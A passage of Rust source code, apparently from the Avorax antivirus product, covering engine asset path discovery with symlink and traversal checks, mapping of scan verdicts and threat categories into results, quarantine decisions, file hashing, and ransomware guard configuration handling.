        push_executable_engine_asset_roots(&mut candidates, parent)?;

        #[cfg(debug_assertions)]
        {
            let current = std::env::current_dir().context(
                "local-core native asset debug discovery failed to read current directory",
            )?;
            push_debug_engine_asset_roots(&mut candidates, &current)?;
        }

        let mut checked = Vec::new();
        for candidate in candidates {
            let normalized = canonicalize_engine_candidate(&candidate)?;
            if checked.iter().any(|path| path == &normalized) {
                continue;
            }
            checked.push(normalized.clone());
            if engine_asset_marker_dir_is_regular(&normalized.join("engine"))?
                || (cfg!(debug_assertions)
                    && engine_asset_marker_dir_is_regular(
                        &normalized.join("assets").join("zentor_native"),
                    )?)
            {
                return Ok(Self::from_root(normalized, checked));
            }
        }

        let fallback = checked.first().cloned().ok_or_else(|| {
            anyhow::anyhow!("local-core native asset discovery found no controlled roots")
        })?;
        Ok(Self::from_root(fallback, checked))
    }

    fn from_root(asset_root: PathBuf, paths_checked: Vec<PathBuf>) -> Self {
        let installed_engine_dir = asset_root.join("engine");
        Self {
            signatures_dir: installed_engine_dir.join("signatures"),
            rules_dir: installed_engine_dir.join("rules"),
            ml_dir: installed_engine_dir.join("ml"),
            trust_dir: installed_engine_dir.join("trust"),
            config_dir: installed_engine_dir.join("config"),
            asset_root,
            installed_engine_dir,
            paths_checked,
        }
    }
}

fn engine_dir_parent_or_self(engine: &Path) -> PathBuf {
    match engine.parent() {
        Some(parent) if parent.as_os_str().is_empty() => parent.to_path_buf(),
        Some(parent) => parent.to_path_buf(),
        None => engine.to_path_buf(),
    }
}

fn absolute_engine_asset_env_path(name: &str) -> anyhow::Result<Option<PathBuf>> {
    let Some(value) = std::env::var_os(name) else {
        return Ok(None);
    };
    let text = value.to_string_lossy().trim().to_string();
    if text.is_empty() {
        anyhow::bail!("{name} is empty");
    }
    validate_local_core_env_root_text(name, &text)?;
    let path = PathBuf::from(text);
    if !engine_asset_root_is_allowed(&path) {
        anyhow::bail!("{name} must be an absolute local path: {}", path.display());
    }
    Ok(Some(path))
}

fn push_executable_engine_asset_roots(
    candidates: &mut Vec<PathBuf>,
    parent: &Path,
) -> anyhow::Result<()> {
    for candidate in [
        parent.to_path_buf(),
        parent.join(".."),
        parent.join("..").join(".."),
        parent.join("..").join("..").join(".."),
    ] {
        push_engine_asset_root(candidates, &candidate)?;
    }
    Ok(())
}

fn push_engine_asset_root(candidates: &mut Vec<PathBuf>, root: &Path) -> anyhow::Result<()> {
    if !engine_asset_root_is_allowed(root) {
        anyhow::bail!(
            "local-core native asset root {} must be an absolute local path",
            root.display()
        );
    }
    if !candidates.iter().any(|existing| existing == root) {
        candidates.push(root.to_path_buf());
    }
    Ok(())
}

#[cfg(windows)]
fn engine_asset_root_is_allowed(path: &Path) -> bool {
    use std::path::{Component, Prefix};

    match path.components().next() {
        Some(Component::Prefix(prefix)) => {
            matches!(prefix.kind(), Prefix::Disk(_) | Prefix::VerbatimDisk(_))
        }
        _ => false,
    }
}

#[cfg(not(windows))]
fn engine_asset_root_is_allowed(path: &Path) -> bool {
    path.is_absolute()
}

#[cfg(debug_assertions)]
fn push_debug_engine_asset_roots(
    candidates: &mut Vec<PathBuf>,
    current: &Path,
) -> anyhow::Result<()> {
    for root in current.ancestors() {
        if is_native_engine_development_root(root)? {
            push_engine_asset_root(candidates, root)?;
        }
    }
    Ok(())
}

#[cfg(debug_assertions)]
fn is_native_engine_development_root(root: &Path) -> anyhow::Result<bool> {
    let marker = root
        .join("core")
        .join("zentor_native_engine")
        .join("Cargo.toml");
    engine_development_marker_file_present(&marker, "local-core native engine development marker")
}

#[cfg(debug_assertions)]
fn engine_development_marker_file_present(path: &Path, description: &str) -> anyhow::Result<bool> {
    match std::fs::symlink_metadata(path) {
        Ok(metadata) => {
            if metadata.file_type().is_symlink() {
                anyhow::bail!("{description} {} is a symbolic link", path.display());
            }
            if engine_asset_metadata_is_windows_reparse_point(&metadata) {
                anyhow::bail!("{description} {} is a reparse point", path.display());
            }
            if !metadata.file_type().is_file() {
                anyhow::bail!("{description} {} is not a regular file", path.display());
            }
            Ok(true)
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(false),
        Err(error) => Err(error)
            .with_context(|| format!("unable to inspect {description} {}", path.display())),
    }
}

fn canonicalize_engine_candidate(candidate: &Path) -> anyhow::Result<PathBuf> {
    match candidate.canonicalize() {
        Ok(normalized) => {
            if !engine_asset_root_is_allowed(&normalized) {
                anyhow::bail!(
                    "local-core native asset root {} must resolve to an absolute local path",
                    candidate.display()
                );
            }
            Ok(normalized)
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(candidate.to_path_buf()),
        Err(error) => Err(error).with_context(|| {
            format!(
                "local-core native asset discovery failed to canonicalize {}",
                candidate.display()
            )
        }),
    }
}

fn engine_asset_marker_dir_is_regular(path: &Path) -> anyhow::Result<bool> {
    match std::fs::symlink_metadata(path) {
        Ok(metadata) => Ok(metadata.is_dir()
            && !metadata.file_type().is_symlink()
            && !engine_asset_metadata_is_windows_reparse_point(&metadata)),
        Err(error) if error.kind() == io::ErrorKind::NotFound => Ok(false),
        Err(error) => Err(error).with_context(|| {
            format!(
                "failed to inspect native engine asset marker {}",
                path.display()
            )
        }),
    }
}

#[cfg(windows)]
fn engine_asset_metadata_is_windows_reparse_point(metadata: &std::fs::Metadata) -> bool {
    use std::os::windows::fs::MetadataExt;

    const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x400;
    metadata.file_attributes() & FILE_ATTRIBUTE_REPARSE_POINT != 0
}

#[cfg(not(windows))]
fn engine_asset_metadata_is_windows_reparse_point(_metadata: &std::fs::Metadata) -> bool {
    false
}

#[derive(Debug, Clone)]
struct ProgramDataDirReport {
    path: Option<PathBuf>,
    error: Option<String>,
}

fn avorax_program_data_dir_report() -> ProgramDataDirReport {
    match avorax_program_data_dir() {
        Ok(path) => ProgramDataDirReport {
            path: Some(path),
            error: None,
        },
        Err(error) => ProgramDataDirReport {
            path: None,
            error: Some(format!("{error:#}")),
        },
    }
}

fn avorax_program_data_dir() -> anyhow::Result<PathBuf> {
    if let Some(path) = local_core_absolute_env_path("AVORAX_DATA_DIR")? {
        return Ok(path);
    }
    #[cfg(windows)]
    {
        if let Some(program_data) = local_core_absolute_env_path("ProgramData")? {
            return Ok(program_data.join("Avorax"));
        }
        if let Some(program_data) = local_core_absolute_env_path("PROGRAMDATA")? {
            return Ok(program_data.join("Avorax"));
        }
    }
    if let Some(home) = local_core_absolute_env_path("HOME")? {
        return Ok(home.join(".local/share/avorax"));
    }
    anyhow::bail!("local-core ProgramData root is unavailable")
}

fn local_core_absolute_env_path(name: &str) -> anyhow::Result<Option<PathBuf>> {
    let Some(value) = std::env::var_os(name) else {
        return Ok(None);
    };
    let text = value.to_string_lossy().trim().to_string();
    if text.is_empty() {
        anyhow::bail!("{name} is empty");
    }
    validate_local_core_env_root_text(name, &text)?;
    let path = PathBuf::from(text);
    if !local_core_runtime_root_is_allowed(&path) {
        anyhow::bail!("{name} must be an absolute local path: {}", path.display());
    }
    Ok(Some(path))
}

fn validate_local_core_env_root_text(name: &str, text: &str) -> anyhow::Result<()> {
    if text.contains('\0') {
        anyhow::bail!("{name} contains NUL");
    }
    if local_core_env_root_has_parent_traversal(text) {
        anyhow::bail!("{name} must not contain parent traversal");
    }
    Ok(())
}

fn local_core_env_root_has_parent_traversal(text: &str) -> bool {
    text.replace('\\', "/").split('/').any(|part| part == "..")
}

#[cfg(windows)]
fn local_core_runtime_root_is_allowed(path: &Path) -> bool {
    use std::path::{Component, Prefix};

    match path.components().next() {
        Some(Component::Prefix(prefix)) => {
            matches!(prefix.kind(), Prefix::Disk(_) | Prefix::VerbatimDisk(_))
        }
        _ => false,
    }
}

#[cfg(not(windows))]
fn local_core_runtime_root_is_allowed(path: &Path) -> bool {
    path.is_absolute()
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct CoreServiceStatusReport {
    status: &'static str,
    error: Option<String>,
}

impl CoreServiceStatusReport {
    fn status(status: &'static str) -> Self {
        Self {
            status,
            error: None,
        }
    }

    fn unknown(error: String) -> Self {
        Self {
            status: "unknown",
            error: Some(error),
        }
    }
}

#[allow(dead_code)]
fn core_service_system_status() -> &'static str {
    core_service_system_status_report().status
}

fn core_service_system_status_report() -> CoreServiceStatusReport {
    #[cfg(windows)]
    {
        use windows_tools::WindowsServiceStatus;

        match windows_tools::query_windows_service_status("avorax_core_service") {
            Ok(WindowsServiceStatus::Missing) => CoreServiceStatusReport::status("missing"),
            Ok(WindowsServiceStatus::Running) => CoreServiceStatusReport::status("running"),
            Ok(WindowsServiceStatus::Stopped) => CoreServiceStatusReport::status("stopped"),
            Ok(WindowsServiceStatus::Installed) => CoreServiceStatusReport::status("installed"),
            Err(error) => CoreServiceStatusReport::unknown(format!(
                "failed to query Avorax Core Service: {error:#}"
            )),
        }
    }
    #[cfg(not(windows))]
    {
        CoreServiceStatusReport::status("unsupported")
    }
}

fn should_surface_native_verdict(verdict: AneVerdict) -> bool {
    !matches!(
        verdict,
        AneVerdict::Clean | AneVerdict::LikelyClean | AneVerdict::Unknown | AneVerdict::Observation
    )
}

fn native_archive_content_scan_limited_detail(
    verdict: &zentor_native_engine::FileScanVerdict,
) -> Option<String> {
    verdict
        .final_verdict
        .evidence
        .iter()
        .find(|evidence| evidence.id == "archive_content_scan_limited")
        .map(|evidence| {
            format!(
                "archive_content_scan_limited: {}: {}",
                evidence.title, evidence.detail
            )
        })
}

fn native_should_quarantine(action_mode: ScanActionMode, threat: &ThreatResult) -> bool {
    match action_mode {
        ScanActionMode::DetectOnly => false,
        ScanActionMode::AutoQuarantineConfirmedOnly => {
            threat.confidence == ThreatConfidence::Confirmed
                && matches!(
                    threat.risk_score.verdict,
                    RiskVerdict::ConfirmedMalware | RiskVerdict::ProbableMalware
                )
        }
        ScanActionMode::AutoQuarantineAllDetections => {
            threat.confidence == ThreatConfidence::Confirmed
                && matches!(threat.risk_score.verdict, RiskVerdict::ConfirmedMalware)
        }
    }
}

fn threat_from_native(
    path: &Path,
    verdict: &zentor_native_engine::FileScanVerdict,
) -> ThreatResult {
    let confidence = native_confidence(verdict.final_verdict.confidence);
    let risk_verdict = native_risk_verdict(verdict.final_verdict.verdict);
    let engines_used = verdict
        .final_verdict
        .engines_used
        .iter()
        .map(native_engine_source)
        .collect::<Vec<_>>();
    let reasons = verdict
        .final_verdict
        .evidence
        .iter()
        .map(|evidence| RiskReason {
            id: evidence.id.clone(),
            title: evidence.title.clone(),
            detail: evidence.detail.clone(),
            weight: evidence.weight,
            severity: if evidence.weight >= 80 {
                RiskSeverity::Critical
            } else if evidence.weight >= 55 {
                RiskSeverity::High
            } else if evidence.weight >= 25 {
                RiskSeverity::Medium
            } else {
                RiskSeverity::Low
            },
            source: native_reason_source(&evidence.source),
        })
        .collect::<Vec<_>>();
    let detection_type = if engines_used.contains(&RiskEngine::Signature) {
        DetectionType::Signature
    } else if engines_used.contains(&RiskEngine::LocalAi) {
        DetectionType::LocalAi
    } else if engines_used.contains(&RiskEngine::Behavior) {
        DetectionType::Behavior
    } else {
        DetectionType::Heuristic
    };
    let recommended_action = native_recommended_action(&verdict.final_verdict.recommended_action);
    ThreatResult {
        id: Uuid::new_v4().to_string(),
        path: path.display().to_string(),
        file_name: display_file_name(path),
        sha256: verdict.sha256.clone(),
        size_bytes: verdict.file_size_bytes,
        detection_type,
        threat_category: native_category(verdict.final_verdict.category),
        threat_name: native_threat_name(verdict.final_verdict.verdict),
        confidence: confidence.clone(),
        engine: "Avorax Native Engine".to_string(),
        detected_at: verdict.scanned_at,
        recommended_action: recommended_action.clone(),
        status: ThreatResultStatus::Detected,
        quarantine_id: None,
        quarantine_path: None,
        quarantine_action_taken: None,
        risk_score: RiskScore {
            score: verdict.final_verdict.risk_score,
            verdict: risk_verdict,
            confidence,
            reasons,
            recommended_action,
            engines_used,
        },
        reason_summary: verdict.final_verdict.user_visible_explanation.clone(),
    }
}

fn native_recommended_action(action: &str) -> RecommendedAction {
    match action {
        "quarantine" | "stop_and_quarantine" => RecommendedAction::Quarantine,
        _ => RecommendedAction::Review,
    }
}

fn windows_antimalware_blocked_scan_error(error: &anyhow::Error) -> bool {
    error.chain().any(|cause| {
        cause
            .downcast_ref::<io::Error>()
            .and_then(io::Error::raw_os_error)
            .is_some_and(|code| {
                code == WINDOWS_ERROR_VIRUS_INFECTED || code == WINDOWS_ERROR_VIRUS_DELETED
            })
    })
}

fn threat_from_windows_antimalware_block(
    path: &Path,
    size_bytes: u64,
    error: &anyhow::Error,
) -> ThreatResult {
    ThreatResult {
        id: Uuid::new_v4().to_string(),
        path: path.display().to_string(),
        file_name: display_file_name(path),
        sha256: String::new(),
        size_bytes,
        detection_type: DetectionType::Reputation,
        threat_category: ThreatCategory::PotentiallyUnwantedApp,
        threat_name: "Windows anti-malware blocked file access".to_string(),
        confidence: ThreatConfidence::Confirmed,
        engine: "Windows anti-malware file access protection".to_string(),
        detected_at: Utc::now(),
        recommended_action: RecommendedAction::Review,
        status: ThreatResultStatus::Detected,
        quarantine_id: None,
        quarantine_path: None,
        quarantine_action_taken: None,
        risk_score: RiskScore {
            score: 100,
            verdict: RiskVerdict::ConfirmedMalware,
            confidence: ThreatConfidence::Confirmed,
            reasons: vec![RiskReason {
                id: "windows_antimalware_blocked_read".to_string(),
                title: "Windows anti-malware blocked file access".to_string(),
                detail: format!(
                    "The operating system denied Avorax read access with a virus/PUA diagnostic: {error:#}. Avorax did not claim quarantine because it could not read or move the file."
                ),
                weight: 100,
                severity: RiskSeverity::Critical,
                source: RiskReasonSource::Signature,
            }],
            recommended_action: RecommendedAction::Review,
            engines_used: vec![RiskEngine::ReputationOptional],
        },
        reason_summary: "Windows anti-malware blocked access to this file with a virus/PUA diagnostic. Avorax surfaced the event as a confirmed detection, but did not claim quarantine because the operating system blocked content access.".to_string(),
    }
}

fn native_confidence(value: AneConfidence) -> ThreatConfidence {
    match value {
        AneConfidence::Confirmed => ThreatConfidence::Confirmed,
        AneConfidence::High => ThreatConfidence::High,
        AneConfidence::Medium => ThreatConfidence::Medium,
        AneConfidence::Low => ThreatConfidence::Low,
    }
}

fn native_risk_verdict(value: AneVerdict) -> RiskVerdict {
    match value {
        AneVerdict::Clean => RiskVerdict::Clean,
        AneVerdict::LikelyClean => RiskVerdict::LikelyClean,
        AneVerdict::Unknown | AneVerdict::Observation => RiskVerdict::Unknown,
        AneVerdict::Suspicious => RiskVerdict::Suspicious,
        AneVerdict::ProbableMalware => RiskVerdict::ProbableMalware,
        AneVerdict::ConfirmedMalware | AneVerdict::TestThreat => RiskVerdict::ConfirmedMalware,
    }
}

fn native_category(value: AneThreatCategory) -> ThreatCategory {
    match value {
        AneThreatCategory::Trojan => ThreatCategory::Trojan,
        AneThreatCategory::Ransomware => ThreatCategory::Ransomware,
        AneThreatCategory::Spyware => ThreatCategory::Spyware,
        AneThreatCategory::Infostealer => ThreatCategory::Infostealer,
        AneThreatCategory::Adware => ThreatCategory::Adware,
        AneThreatCategory::Worm => ThreatCategory::Worm,
        AneThreatCategory::Keylogger => ThreatCategory::Keylogger,
        AneThreatCategory::Miner => ThreatCategory::Miner,
        AneThreatCategory::RootkitIndicator => ThreatCategory::RootkitIndicator,
        AneThreatCategory::PotentiallyUnwantedApp => ThreatCategory::PotentiallyUnwantedApp,
        AneThreatCategory::SuspiciousDownloader => ThreatCategory::SuspiciousDownloader,
        AneThreatCategory::SuspiciousScript => ThreatCategory::SuspiciousScript,
        AneThreatCategory::MaliciousMacro => ThreatCategory::MaliciousMacro,
        AneThreatCategory::ExploitDropper => ThreatCategory::ExploitDropper,
        AneThreatCategory::CredentialTheftIndicator => ThreatCategory::CredentialTheftIndicator,
        AneThreatCategory::PersistenceIndicator => ThreatCategory::PersistenceIndicator,
        AneThreatCategory::SecurityTamperIndicator => ThreatCategory::SecurityTamperIndicator,
        AneThreatCategory::TestThreat => ThreatCategory::Unknown,
        AneThreatCategory::Unknown => ThreatCategory::Unknown,
    }
}

fn native_threat_name(value: AneVerdict) -> String {
    match value {
        AneVerdict::TestThreat => "EICAR safe anti-malware test file".to_string(),
        AneVerdict::ConfirmedMalware => "Confirmed threat".to_string(),
        AneVerdict::ProbableMalware => "Probable malware".to_string(),
        AneVerdict::Suspicious => "Suspicious item".to_string(),
        AneVerdict::Observation => "Low-priority observation".to_string(),
        _ => "Native engine review".to_string(),
    }
}

fn native_engine_source(
    source: &zentor_native_engine::verdict::risk_fusion::EvidenceSource,
) -> RiskEngine {
    match source {
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::NativeSignature => {
            RiskEngine::Signature
        }
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::NativeRule
        | zentor_native_engine::verdict::risk_fusion::EvidenceSource::NativeHeuristic
        | zentor_native_engine::verdict::risk_fusion::EvidenceSource::ApplicationControl
        | zentor_native_engine::verdict::risk_fusion::EvidenceSource::TrustStore => {
            RiskEngine::Heuristic
        }
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::NativeMl => RiskEngine::LocalAi,
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::CloudReputation => {
            RiskEngine::ReputationOptional
        }
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::NativeBehavior => {
            RiskEngine::Behavior
        }
    }
}

fn native_reason_source(
    source: &zentor_native_engine::verdict::risk_fusion::EvidenceSource,
) -> RiskReasonSource {
    match source {
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::NativeSignature => {
            RiskReasonSource::Signature
        }
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::NativeMl => {
            RiskReasonSource::AiModel
        }
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::NativeBehavior => {
            RiskReasonSource::Behavior
        }
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::CloudReputation => {
            RiskReasonSource::CloudOptional
        }
        zentor_native_engine::verdict::risk_fusion::EvidenceSource::TrustStore => {
            RiskReasonSource::UserLabel
        }
        _ => RiskReasonSource::Heuristic,
    }
}

#[allow(dead_code)]
fn threat_from_signature(
    path: &Path,
    result: &scanner::ScanResult,
) -> anyhow::Result<ThreatResult> {
    let metadata = inspect_regular_scan_target(path, "signature threat target")?;
    anyhow::ensure!(
        !result.sha256.trim().is_empty(),
        "signature threat result is missing SHA-256"
    );
    Ok(ThreatResult {
        id: Uuid::new_v4().to_string(),
        path: path.display().to_string(),
        file_name: display_file_name(path),
        sha256: result.sha256.clone(),
        size_bytes: metadata.len(),
        detection_type: DetectionType::Signature,
        threat_category: ThreatCategory::Unknown,
        threat_name: signature_threat_name(result),
        confidence: ThreatConfidence::Confirmed,
        engine: result.engine.clone(),
        detected_at: result.scanned_at,
        recommended_action: RecommendedAction::Quarantine,
        status: ThreatResultStatus::Detected,
        quarantine_id: None,
        quarantine_path: None,
        quarantine_action_taken: None,
        risk_score: RiskScore {
            score: 100,
            verdict: RiskVerdict::ConfirmedMalware,
            confidence: ThreatConfidence::Confirmed,
            reasons: vec![RiskReason {
                id: "signature_match".to_string(),
                title: "Known malware signature".to_string(),
                detail: "The local signature engine matched this file.".to_string(),
                weight: 100,
                severity: RiskSeverity::Critical,
                source: RiskReasonSource::Signature,
            }],
            recommended_action: RecommendedAction::Quarantine,
            engines_used: vec![RiskEngine::Signature],
        },
        reason_summary: "Known malware signature matched by the local engine.".to_string(),
    })
}

#[allow(dead_code)]
fn signature_threat_name(result: &scanner::ScanResult) -> String {
    match result.threat_name.as_deref() {
        Some(name) if !name.trim().is_empty() => name.to_string(),
        Some(_) => default_signature_threat_name(),
        None => default_signature_threat_name(),
    }
}

#[allow(dead_code)]
fn default_signature_threat_name() -> String {
    "Known malware signature".to_string()
}

#[allow(dead_code)]
fn threat_from_ai(
    path: &Path,
    result: &ai::model_runner::LocalAiResult,
) -> anyhow::Result<ThreatResult> {
    let metadata = inspect_regular_scan_target(path, "local AI threat target")?;
    let confidence = local_ai_confidence(&result.confidence)?;
    let verdict = match result.verdict {
        ai::verdict::LocalAiVerdictLabel::ConfirmedMalware => RiskVerdict::ConfirmedMalware,
        ai::verdict::LocalAiVerdictLabel::ProbableMalware => RiskVerdict::ProbableMalware,
        ai::verdict::LocalAiVerdictLabel::Suspicious => RiskVerdict::Suspicious,
        ai::verdict::LocalAiVerdictLabel::Unknown => RiskVerdict::Unknown,
        ai::verdict::LocalAiVerdictLabel::LikelyClean => RiskVerdict::LikelyClean,
        ai::verdict::LocalAiVerdictLabel::Clean => RiskVerdict::Clean,
    };
    let category = category_from_ai(&result.top_category)?;
    let threat_name = match verdict {
        RiskVerdict::ProbableMalware => category_label(&category).to_string(),
        RiskVerdict::ConfirmedMalware => "Confirmed threat".to_string(),
        _ => "AI review suggested".to_string(),
    };
    let score = (result.malware_probability * 100.0)
        .round()
        .clamp(0.0, 100.0) as u8;
    let reason_detail = result.explanation_reasons.join(" ");
    Ok(ThreatResult {
        id: Uuid::new_v4().to_string(),
        path: path.display().to_string(),
        file_name: display_file_name(path),
        sha256: sha256_for_file(path)?,
        size_bytes: metadata.len(),
        detection_type: DetectionType::LocalAi,
        threat_category: category,
        threat_name,
        confidence: confidence.clone(),
        engine: format!("zentor-local-ai/{}", result.model_version),
        detected_at: Utc::now(),
        recommended_action: if result.production_ready
            && matches!(
                verdict,
                RiskVerdict::ProbableMalware | RiskVerdict::ConfirmedMalware
            ) {
            RecommendedAction::Quarantine
        } else {
            RecommendedAction::Review
        },
        status: ThreatResultStatus::Detected,
        quarantine_id: None,
        quarantine_path: None,
        quarantine_action_taken: None,
        risk_score: RiskScore {
            score,
            verdict,
            confidence,
            reasons: vec![RiskReason {
                id: "local_ai_static_model".to_string(),
                title: "Local AI static analysis".to_string(),
                detail: if result.production_ready {
                    reason_detail
                } else {
                    format!("{reason_detail} Development model only; review result manually.")
                },
                weight: score as i32,
                severity: if score >= 90 {
                    RiskSeverity::High
                } else {
                    RiskSeverity::Medium
                },
                source: RiskReasonSource::AiModel,
            }],
            recommended_action: RecommendedAction::Review,
            engines_used: vec![RiskEngine::LocalAi],
        },
        reason_summary: format!(
            "Local AI probability {:.1}%. {}",
            result.malware_probability * 100.0,
            result.explanation_reasons.join(" ")
        ),
    })
}

#[allow(dead_code)]
fn local_ai_confidence(value: &str) -> anyhow::Result<ThreatConfidence> {
    match value {
        "confirmed" => Ok(ThreatConfidence::Confirmed),
        "high" => Ok(ThreatConfidence::High),
        "medium" => Ok(ThreatConfidence::Medium),
        "low" => Ok(ThreatConfidence::Low),
        _ => anyhow::bail!("local AI result has unsupported confidence label: {value}"),
    }
}

#[allow(dead_code)]
fn category_from_ai(category: &str) -> anyhow::Result<ThreatCategory> {
    match category {
        "unknown" => Ok(ThreatCategory::Unknown),
        "trojan" => Ok(ThreatCategory::Trojan),
        "ransomware" => Ok(ThreatCategory::Ransomware),
        "spyware" => Ok(ThreatCategory::Spyware),
        "infostealer" => Ok(ThreatCategory::Infostealer),
        "adware" => Ok(ThreatCategory::Adware),
        "worm" => Ok(ThreatCategory::Worm),
        "keylogger" => Ok(ThreatCategory::Keylogger),
        "miner" => Ok(ThreatCategory::Miner),
        "rootkit_indicator" => Ok(ThreatCategory::RootkitIndicator),
        "potentially_unwanted_app" => Ok(ThreatCategory::PotentiallyUnwantedApp),
        "suspicious_downloader" => Ok(ThreatCategory::SuspiciousDownloader),
        "suspicious_script" => Ok(ThreatCategory::SuspiciousScript),
        "malicious_macro" => Ok(ThreatCategory::MaliciousMacro),
        "exploit_dropper" => Ok(ThreatCategory::ExploitDropper),
        "credential_theft_indicator" => Ok(ThreatCategory::CredentialTheftIndicator),
        "persistence_indicator" => Ok(ThreatCategory::PersistenceIndicator),
        "security_tamper_indicator" => Ok(ThreatCategory::SecurityTamperIndicator),
        _ => anyhow::bail!("local AI result has unsupported category label: {category}"),
    }
}

#[allow(dead_code)]
fn category_label(category: &ThreatCategory) -> &'static str {
    match category {
        ThreatCategory::Trojan => "Potential Trojan",
        ThreatCategory::Ransomware => "Potential Ransomware",
        ThreatCategory::Spyware => "Potential Spyware",
        ThreatCategory::Infostealer => "Potential Infostealer",
        ThreatCategory::Adware => "Potential Adware",
        ThreatCategory::Worm => "Potential Worm",
        ThreatCategory::Keylogger => "Potential Keylogger",
        ThreatCategory::Miner => "Potential Miner",
        ThreatCategory::RootkitIndicator => "Rootkit Indicator",
        ThreatCategory::PotentiallyUnwantedApp => "Potentially Unwanted App",
        ThreatCategory::SuspiciousDownloader => "Suspicious Downloader",
        ThreatCategory::SuspiciousScript => "Suspicious Script",
        ThreatCategory::MaliciousMacro => "Malicious Macro Indicator",
        ThreatCategory::ExploitDropper => "Exploit Dropper Indicator",
        ThreatCategory::CredentialTheftIndicator => "Credential Theft Indicator",
        ThreatCategory::PersistenceIndicator => "Persistence Indicator",
        ThreatCategory::SecurityTamperIndicator => "Security Tamper Indicator",
        ThreatCategory::Unknown => "Unknown Suspicious File",
    }
}

fn parse_action_mode(raw: Option<&str>) -> ScanActionMode {
    match raw {
        Some("autoQuarantine") | Some("auto_quarantine") | Some("autoQuarantineConfirmedOnly") => {
            ScanActionMode::AutoQuarantineConfirmedOnly
        }
        Some("autoQuarantineAllDetections") => ScanActionMode::AutoQuarantineAllDetections,
        _ => ScanActionMode::DetectOnly,
    }
}

fn parse_scan_kind(raw: Option<&str>) -> ScanKind {
    match raw {
        Some("quick") => ScanKind::Quick,
        Some("full") => ScanKind::Full,
        _ => ScanKind::Custom,
    }
}

fn sha256_for_file(path: &Path) -> anyhow::Result<String> {
    let metadata = inspect_regular_scan_target(path, "file to hash")?;
    if metadata.len() > MAX_LOCAL_CORE_HASH_BYTES {
        return Err(anyhow::anyhow!(
            "file to hash {} exceeds maximum size of {} bytes",
            path.display(),
            MAX_LOCAL_CORE_HASH_BYTES
        ));
    }
    let mut hasher = Sha256::new();
    let mut reader = std::io::BufReader::new(
        std::fs::File::open(path)
            .with_context(|| format!("unable to open file for hashing {}", path.display()))?,
    );
    let mut total = 0_u64;
    let mut buffer = [0u8; 64 * 1024];
    loop {
        let read = reader
            .read(&mut buffer)
            .with_context(|| format!("unable to hash file {}", path.display()))?;
        if read == 0 {
            break;
        }
        total = total
            .checked_add(read as u64)
            .ok_or_else(|| anyhow::anyhow!("local-core hash size overflow"))?;
        if total > MAX_LOCAL_CORE_HASH_BYTES {
            return Err(anyhow::anyhow!(
                "file to hash {} exceeds maximum size of {} bytes",
                path.display(),
                MAX_LOCAL_CORE_HASH_BYTES
            ));
        }
        hasher.update(&buffer[..read]);
    }
    Ok(format!("{:x}", hasher.finalize()))
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
struct PersistedRansomwareGuardConfig {
    protected_roots: Vec<String>,
    trusted_process_allowlist: Vec<String>,
    updated_at: DateTime<Utc>,
    source: String,
}

fn write_ransomware_guard_config(
    protected_roots: Vec<String>,
    trusted_process_allowlist: Vec<String>,
) -> anyhow::Result<String> {
    let protected_roots = normalize_ransomware_paths(protected_roots, true)?;
    let trusted_process_allowlist = normalize_ransomware_paths(trusted_process_allowlist, false)?;
    let path = ransomware_guard_config_path()?;
    ensure_config_parent(&path)?;
    let config = PersistedRansomwareGuardConfig {
        protected_roots,
        trusted_process_allowlist,
        updated_at: Utc::now(),
        source: "avorax_local_core".to_string(),
    };
    write_config_staged(&path, &serde_json::to_string_pretty(&config)?)?;
    Ok(path.display().to_string())
}

fn read_ransomware_guard_config() -> anyhow::Result<PersistedRansomwareGuardConfig> {
    let path = ransomware_guard_config_path()?;
    if !config_file_present(&path, "ransomware guard config")? {
        return Ok(PersistedRansomwareGuardConfig {
            protected_roots: Vec::new(),
            trusted_process_allowlist: Vec::new(),
            updated_at: Utc::now(),
            source: "default".to_string(),
        });
    }
    let raw = read_bounded_config_text(
        &path,
        MAX_RANSOMWARE_GUARD_CONFIG_BYTES,
        "ransomware guard config",
    )?;
    let config: PersistedRansomwareGuardConfig = serde_json::from_str(&raw)
        .with_context(|| format!("unable to parse ransomware guard config {}", path.display()))?;
    validate_ransomware_guard_config(&config)
        .with_context(|| format!("invalid ransomware guard config {}", path.display()))?;
    Ok(config)
}

fn read_bounded_config_text(path: &Path, max_bytes: u64, label: &str) -> anyhow::Result<String> {
    let metadata = ensure_regular_config_file(path, label)?;
    if metadata.len() > max_bytes {
        return Err(anyhow::anyhow!(
            "{label} {} exceeds maximum size of {max_bytes} bytes",
            path.display()
        ));
    }
    let file = std::fs::File::open(path)
        .with_context(|| format!("unable to read {label} {}", path.display()))?;
    let mut reader = std::io::BufReader::new(file);
    let mut bytes = Vec::new();
    let mut buffer = [0_u8; 8 * 1024];
    let mut total = 0_u64;
    loop {
        let read = reader
            .read(&mut buffer)
            .with_context(|| format!("unable to read {label} {}", path.display()))?;
        if read == 0 {
            break;
        }
        total = total
            .checked_add(read as u64)
            .ok_or_else(|| anyhow::anyhow!("{label} {} size overflow", path.display()))?;
        if total > max_bytes {
            return Err(anyhow::anyhow!(
                "{label} {} exceeds maximum size of {max_bytes} bytes",
                path.display()
            ));
        }
        bytes.extend_from_slice(&buffer[..read]);
    }
    String::from_utf8(bytes).with_context(|| format!("unable to read {label} {}", path.display()))
}

fn config_file_present(path: &Path, label: &str) -> anyhow::Result<bool> {
    match std::fs::symlink_metadata(path) {
        Ok(metadata) => {
            ensure_regular_config_metadata(path, label, &metadata)?;
            Ok(true)
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(false),
        Err(error) => {
            Err(error).with_context(|| format!("unable to inspect {label} {}", path.display()))
        }
    }
}

fn ensure_regular_config_file(path: &Path, label: &str) -> anyhow::Result<std::fs::Metadata> {
    let metadata = std::fs::symlink_metadata(path)
        .with_context(|| format!("unable to inspect {label} {}", path.display()))?;
